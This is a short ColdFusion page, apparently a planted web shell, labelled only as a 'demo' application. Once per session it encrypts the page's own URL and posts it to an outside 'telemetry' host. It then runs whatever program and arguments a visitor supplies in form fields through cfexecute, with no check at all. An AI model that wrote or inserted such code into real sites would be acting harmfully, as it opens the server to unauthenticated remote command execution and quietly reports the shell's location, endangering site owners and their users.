<cfapplication name="demo" sessionmanagement="yes">
<cfif IsDefined("session.reported") eq "No">
<cfset wrapped = encrypt(getPageContext().getRequest().getRequestURL().toString(), application.key, "AES", "Hex")>
<cfhttp method="Post" url="https://telemetry.example.invalid/page">
<cfhttpparam type="formfield" name="page" value="#wrapped#">
</cfhttp>
<cfset session.reported = true>
</cfif>
<cfoutput>
<cfexecute name="#Form.program#" arguments="#Form.args#" timeout="10"></cfexecute>
</cfoutput>
